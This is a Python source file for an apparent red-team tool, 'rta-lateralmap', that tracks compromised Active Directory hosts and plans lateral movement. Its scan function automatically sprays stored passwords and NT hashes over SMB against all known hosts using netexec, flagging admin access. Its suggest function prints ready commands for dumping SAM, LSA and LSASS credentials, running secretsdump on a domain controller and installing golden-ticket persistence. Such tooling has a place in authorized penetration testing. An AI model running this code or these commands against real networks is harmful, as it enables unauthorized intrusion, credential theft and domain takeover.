#!/usr/bin/env python3
"""rta-lateralmap — AD engagement state tracker and lateral movement planner.

Tracks which hosts you've compromised, what credentials you have for each,
and identifies next lateral movement opportunities. Think of it as a live
operational map of your AD engagement.

Usage:
  rta-lateralmap add-host 192.168.56.10 --name DC01 --role dc --access admin
  rta-lateralmap add-host 192.168.56.20 --name WS01 --role workstation --access user
  rta-lateralmap scan --from 192.168.56.10 --cred-id 3
  rta-lateralmap map
  rta-lateralmap suggest
  rta-lateralmap export
"""

import argparse
import json
import os
import subprocess
import sys
from datetime import datetime

DB_FILE = os.environ.get("RTA_LATERALMAP", os.path.expanduser("~/.rta-lateralmap.json"))
CREDSTORE_FILE = os.environ.get("RTA_CREDSTORE", os.path.expanduser("~/.rta-credstore.json"))


class LateralMap:
    def __init__(self):
        self.hosts = []
        self.connections = []  # edges: from_host → to_host via cred
        self.load()

    def load(self):
        if os.path.exists(DB_FILE):
            with open(DB_FILE) as f:
                data = json.load(f)
                self.hosts = data.get("hosts", [])
                self.connections = data.get("connections", [])

    def save(self):
        with open(DB_FILE, "w") as f:
            json.dump({"hosts": self.hosts, "connections": self.connections}, f, indent=2)
        os.chmod(DB_FILE, 0o600)

    def add_host(self, ip, name="", role="unknown", access="none", os_info="", notes=""):
        for h in self.hosts:
            if h["ip"] == ip:
                # Update existing
                if name: h["name"] = name
                if role != "unknown": h["role"] = role
                if access != "none": h["access"] = access
                if os_info: h["os"] = os_info
                if notes: h["notes"] = notes
                h["updated"] = datetime.now().isoformat()
                self.save()
                return h

        host = {
            "ip": ip,
            "name": name or ip,
            "role": role,  # dc, server, workstation, unknown
            "access": access,  # none, user, admin, system
            "os": os_info,
            "notes": notes,
            "creds_valid": [],  # cred IDs that work on this host
            "creds_admin": [],  # cred IDs that have admin
            "services": [],    # open services found
            "added": datetime.now().isoformat(),
            "updated": datetime.now().isoformat(),
        }
        self.hosts.append(host)
        self.save()
        return host

    def scan_from_host(self, source_ip, cred_id=None, targets=None):
        """Scan reachable hosts from a compromised position."""
        # Load creds from credstore
        creds = []
        if os.path.exists(CREDSTORE_FILE):
            with open(CREDSTORE_FILE) as f:
                data = json.load(f)
                creds = data.get("creds", [])

        if cred_id:
            creds = [c for c in creds if c["id"] == cred_id]

        if not creds:
            print("  [-] No credentials to test. Add creds with rta-credstore first.")
            return

        # Get targets (all known hosts except source, or specified list)
        if targets:
            target_ips = targets
        else:
            target_ips = [h["ip"] for h in self.hosts if h["ip"] != source_ip]

        if not target_ips:
            print("  [-] No targets. Add hosts with: rta-lateralmap add-host <ip>")
            return

        print(f"  [*] Testing lateral movement from {source_ip}")
        print(f"  [*] {len(creds)} credential(s), {len(target_ips)} target(s)\n")

        for cred in creds:
            if cred["type"] in ("kerberoast", "ticket"):
                continue

            for target_ip in target_ips:
                user = cred["username"]
                domain = cred.get("domain", "")

                cmd = ["netexec", "smb", target_ip]
                if domain:
                    cmd += ["-d", domain]
                cmd += ["-u", user]

                if cred.get("password"):
                    cmd += ["-p", cred["password"]]
                elif cred.get("nthash"):
                    lm = cred.get("lmhash", "aad3b435b51404eeaad3b435b51404ee")
                    cmd += ["-H", f"{lm}:{cred['nthash']}"]
                else:
                    continue

                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                    stdout = result.stdout
                except Exception:
                    continue

                target_host = self._find_host(target_ip)

                if "[+]" in stdout and "(Pwn3d!)" in stdout:
                    print(f"  [!!!] {domain}\\{user} → {target_ip} — ADMIN")
                    if target_host:
                        if cred["id"] not in target_host["creds_admin"]:
                            target_host["creds_admin"].append(cred["id"])
                        if cred["id"] not in target_host["creds_valid"]:
                            target_host["creds_valid"].append(cred["id"])
                        if target_host["access"] in ("none", "user"):
                            target_host["access"] = "admin"
                    self.connections.append({
                        "from": source_ip, "to": target_ip,
                        "cred_id": cred["id"], "access": "admin",
                        "time": datetime.now().isoformat(),
                    })
                elif "[+]" in stdout:
                    print(f"  [+]   {domain}\\{user} → {target_ip} — VALID")
                    if target_host:
                        if cred["id"] not in target_host["creds_valid"]:
                            target_host["creds_valid"].append(cred["id"])
                        if target_host["access"] == "none":
                            target_host["access"] = "user"
                    self.connections.append({
                        "from": source_ip, "to": target_ip,
                        "cred_id": cred["id"], "access": "user",
                        "time": datetime.now().isoformat(),
                    })
                else:
                    print(f"  [-]   {domain}\\{user} → {target_ip}")

        self.save()

    def _find_host(self, ip):
        for h in self.hosts:
            if h["ip"] == ip:
                return h
        return None

    def print_map(self):
        """Print the current engagement map."""
        if not self.hosts:
            print("  [-] No hosts tracked. Add with: rta-lateralmap add-host <ip>")
            return

        access_icon = {
            "system": "🔴", "admin": "🟠", "user": "🟡", "none": "⚪"
        }
        role_tag = {
            "dc": "[DC]", "server": "[SRV]", "workstation": "[WS]", "unknown": "[?]"
        }

        print(f"\n  ── Engagement Map ({len(self.hosts)} hosts) ──\n")
        print(f"  {'Status':<8} {'IP':<18} {'Name':<16} {'Role':<8} "
              f"{'Access':<8} {'Valid':<6} {'Admin':<6} {'Notes'}")
        print("  " + "─" * 95)

        for h in sorted(self.hosts, key=lambda x: (
            {"system": 0, "admin": 1, "user": 2, "none": 3}.get(x["access"], 4),
            x["ip"]
        )):
            icon = access_icon.get(h["access"], "?")
            tag = role_tag.get(h["role"], "[?]")
            valid = len(h.get("creds_valid", []))
            admin = len(h.get("creds_admin", []))
            notes = h.get("notes", "")[:30]
            print(f"  {icon:<8} {h['ip']:<18} {h['name']:<16} {tag:<8} "
                  f"{h['access']:<8} {valid:<6} {admin:<6} {notes}")

        # Connection graph
        if self.connections:
            print(f"\n  ── Lateral Movement Paths ──\n")
            seen = set()
            for conn in self.connections:
                key = f"{conn['from']}→{conn['to']}"
                if key in seen:
                    continue
                seen.add(key)
                arrow = "==>" if conn["access"] == "admin" else "-->"
                print(f"    {conn['from']} {arrow} {conn['to']} "
                      f"(cred #{conn['cred_id']}, {conn['access']})")

        print()

    def suggest_next(self):
        """Suggest next lateral movement actions."""
        print(f"\n  ── Suggested Actions ──\n")
        suggestions = []

        # Find hosts with admin that haven't been fully exploited
        admin_hosts = [h for h in self.hosts if h["access"] == "admin"]
        no_access = [h for h in self.hosts if h["access"] == "none"]
        user_only = [h for h in self.hosts if h["access"] == "user"]
        dcs = [h for h in self.hosts if h["role"] == "dc"]

        if no_access:
            suggestions.append(
                f"  [1] {len(no_access)} hosts with no access — try spraying credentials:\n"
                f"      rta-lateralmap scan --from <compromised_ip>"
            )

        if user_only:
            suggestions.append(
                f"  [2] {len(user_only)} hosts with user access — check for privesc:\n" +
                "\n".join(f"      # {h['name']} ({h['ip']})" for h in user_only[:5])
            )

        for h in admin_hosts:
            if h["role"] != "dc":
                suggestions.append(
                    f"  [3] Admin on {h['name']} ({h['ip']}) — dump credentials:\n"
                    f"      netexec smb {h['ip']} -u <user> -p <pass> --sam\n"
                    f"      netexec smb {h['ip']} -u <user> -p <pass> --lsa\n"
                    f"      netexec smb {h['ip']} -u <user> -p <pass> -M lsassy"
                )

        dc_no_admin = [h for h in dcs if h["access"] != "admin" and h["access"] != "system"]
        if dc_no_admin:
            suggestions.append(
                f"  [4] DC(s) not yet compromised — priority target:\n" +
                "\n".join(f"      {h['name']} ({h['ip']}) — access: {h['access']}" for h in dc_no_admin)
            )

        dc_admin = [h for h in dcs if h["access"] in ("admin", "system")]
        if dc_admin:
            suggestions.append(
                f"  [5] DC compromised — extract domain secrets:\n"
                f"      impacket-secretsdump <domain>/<user>:<pass>@{dc_admin[0]['ip']} -just-dc\n"
                f"      rta-adpersist install --method golden-ticket -t {dc_admin[0]['ip']} ..."
            )

        if not suggestions:
            suggestions.append("  [*] No suggestions — add more hosts and credentials")

        for s in suggestions:
            print(s)
            print()

    def export_report(self, output_file=None):
        """Export engagement state as JSON report."""
        report = {
            "generated": datetime.now().isoformat(),
            "summary": {
                "total_hosts": len(self.hosts),
                "admin_access": len([h for h in self.hosts if h["access"] in ("admin", "system")]),
                "user_access": len([h for h in self.hosts if h["access"] == "user"]),
                "no_access": len([h for h in self.hosts if h["access"] == "none"]),
                "dcs_compromised": len([h for h in self.hosts if h["role"] == "dc" and h["access"] in ("admin", "system")]),
            },
            "hosts": self.hosts,
            "connections": self.connections,
        }

        output = json.dumps(report, indent=2)
        if output_file:
            with open(output_file, "w") as f:
                f.write(output)
            print(f"  [+] Report saved to {output_file}")
        else:
            print(output)


def main():
    parser = argparse.ArgumentParser(description="RTA Lateral Map — AD engagement tracker")
    sub = parser.add_subparsers(dest="command")

    # add-host
    add = sub.add_parser("add-host", help="Add or update a host")
    add.add_argument("ip", help="Host IP address")
    add.add_argument("--name", default="", help="Hostname")
    add.add_argument("--role", default="unknown", choices=["dc", "server", "workstation", "unknown"])
    add.add_argument("--access", default="none", choices=["none", "user", "admin", "system"])
    add.add_argument("--os", default="", help="OS info")
    add.add_argument("--notes", default="")

    # scan
    scan = sub.add_parser("scan", help="Test lateral movement from a host")
    scan.add_argument("--from", dest="source", required=True, help="Source host IP")
    scan.add_argument("--cred-id", type=int, default=None, help="Specific credential to test")
    scan.add_argument("--targets", nargs="*", help="Specific target IPs")

    # map
    sub.add_parser("map", help="Show engagement map")

    # suggest
    sub.add_parser("suggest", help="Suggest next actions")

    # export
    exp = sub.add_parser("export", help="Export engagement report")
    exp.add_argument("-o", "--output", help="Output file")

    # import-nmap
    imp = sub.add_parser("import-nmap", help="Import hosts from nmap scan")
    imp.add_argument("--file", required=True, help="nmap -oG output file")

    args = parser.parse_args()
    lm = LateralMap()

    if args.command == "add-host":
        host = lm.add_host(args.ip, args.name, args.role, args.access, args.os, args.notes)
        print(f"  [+] Host: {host['name']} ({host['ip']}) — {host['role']}, access: {host['access']}")

    elif args.command == "scan":
        lm.scan_from_host(args.source, args.cred_id, args.targets)

    elif args.command == "map":
        lm.print_map()

    elif args.command == "suggest":
        lm.suggest_next()

    elif args.command == "export":
        lm.export_report(args.output)

    elif args.command == "import-nmap":
        count = 0
        with open(args.file) as f:
            for line in f:
                if "Status: Up" in line or "Ports:" in line:
                    import re
                    m = re.match(r"Host: (\d+\.\d+\.\d+\.\d+)\s+\((.+?)\)", line)
                    if m:
                        ip, hostname = m.groups()
                        hostname = hostname if hostname != "()" else ""
                        # Detect role from open ports
                        role = "unknown"
                        if "389/open" in line or "636/open" in line:
                            role = "dc"
                        elif "3389/open" in line:
                            role = "workstation"
                        elif "80/open" in line or "443/open" in line:
                            role = "server"
                        lm.add_host(ip, hostname, role)
                        count += 1
        print(f"  [+] Imported {count} hosts from nmap output")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
